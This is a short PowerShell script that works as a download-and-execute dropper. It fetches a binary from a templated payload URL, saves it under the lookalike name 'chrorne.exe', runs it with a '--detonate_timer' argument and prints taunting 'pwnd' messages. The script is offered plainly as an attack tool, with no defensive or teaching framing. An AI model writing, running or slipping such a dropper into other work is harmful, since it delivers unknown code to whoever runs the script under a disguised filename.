function SayHiToTheIdiot{
    Write-Host "You absolute dick you almost got pwnd"
}


function DownloadAndRunExecutable {
    param(
        [string]$url,
        [string[]]$CLIArguments
    )

    $exePath = Join-Path $PWD "chrorne.exe"
    Invoke-WebRequest -Uri $url -OutFile $exePath

    & $exePath @CLIArguments
    Write-Host "You Have Been Pwnd"
}



SayHiToTheIdiot
DownloadAndRunExecutable -Url "{{Binary Payload URL}}" -CLIArguments @("--detonate_timer=300000ms")


